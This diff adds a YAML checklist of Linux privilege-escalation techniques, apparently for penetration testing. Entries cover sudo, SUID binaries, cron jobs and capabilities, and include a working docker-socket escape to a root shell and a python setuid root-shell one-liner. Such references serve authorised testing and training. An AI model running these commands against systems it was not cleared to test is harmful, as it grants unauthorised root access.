@@ -1,0 +1,59 @@
+- id: "linux-sudo-check"
+  title: "Sudo Rights & NOPASSWD Checks"
+  phase: "enumeration"
+  purpose: "Inspect what commands the current user can execute as superuser (root) or other users without password verification."
+  command: "sudo -l"
+  expected_output:
+    - "User developer may run the following commands on target:\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py"
+    - "    (root) /usr/bin/find"
+  common_mistakes:
+    - "Not checking GTFOBins (https://gtfobins.github.io/) for allowed sudo binary bypasses."
+    - "Failing to check LD_PRELOAD or SETENV environment flags inside sudo -l output."
+
+- id: "linux-suid-bins"
+  title: "SUID & SGID Binaries Discovery"
+  phase: "enumeration"
+  purpose: "Find binaries with the SUID bit set that execute with the privileges of the file owner (typically root)."
+  command: "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null"
+  expected_output:
+    - "-rwsr-xr-x 1 root root  44120 Jan 15 2022 /usr/bin/passwd"
+    - "-rwsr-xr-x 1 root root 124312 May 10 2023 /usr/local/bin/custom_backup"
+    - "-rwsr-xr-x 1 root root  54888 Feb 07 2020 /usr/bin/pkexec"
+  common_mistakes:
+    - "Ignoring non-standard paths like /opt/, /tmp/, /var/, or /usr/local/bin/."
+    - "Failing to run `strings` or `ltrace` on custom SUID binaries to discover unquoted or relative path command execution."
+
+- id: "linux-docker-escape"
+  title: "Privilege Escalation via Docker Socket / Group"
+  phase: "exploitation"
+  purpose: "If the current user belongs to the 'docker' group or has read/write access to /var/run/docker.sock, spawn a container with the host root filesystem mounted to obtain immediate root access."
+  command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+  expected_output:
+    - "# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)"
+  common_mistakes:
+    - "Attempting to download an external image when internet is restricted; instead, use `docker images` to find pre-cached local images."
+    - "Not checking if docker daemon is reachable via TCP port 2375 without TLS."
+
+- id: "linux-cron-scheduled"
+  title: "Cron Jobs & Scheduled Tasks Inspection"
+  phase: "enumeration"
+  purpose: "Enumerate system crontabs, user crontabs, systemd timers, and writable scripts executed periodically by root."
+  command: "cat /etc/crontab /etc/cron.*/* 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null"
+  expected_output:
+    - "*/5 * * * * root /usr/local/bin/cleanup.sh"
+    - "0 0 * * * root /opt/maintenance.py"
+  common_mistakes:
+    - "Overlooking write permissions on scripts or parent directories called by root cron jobs."
+    - "Not monitoring cron execution in real time with tools like `pspy` to catch transient cron jobs."
+
+- id: "linux-capabilities"
+  title: "Linux Capabilities (getcap) Discovery"
+  phase: "enumeration"
+  purpose: "Search for files with granted Linux capabilities like cap_setuid, cap_net_raw, or cap_dac_override that allow privilege escalation without full SUID."
+  command: "getcap -r / 2>/dev/null"
+  expected_output:
+    - "/usr/bin/python3.10 = cap_setuid+ep"
+    - "/usr/bin/tar = cap_dac_read_search+ep"
+    - "/usr/bin/ping = cap_net_raw+ep"
+  common_mistakes:
+    - "Missing capability-based privilege escalation vectors documented on GTFOBins (e.g. `python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`)."
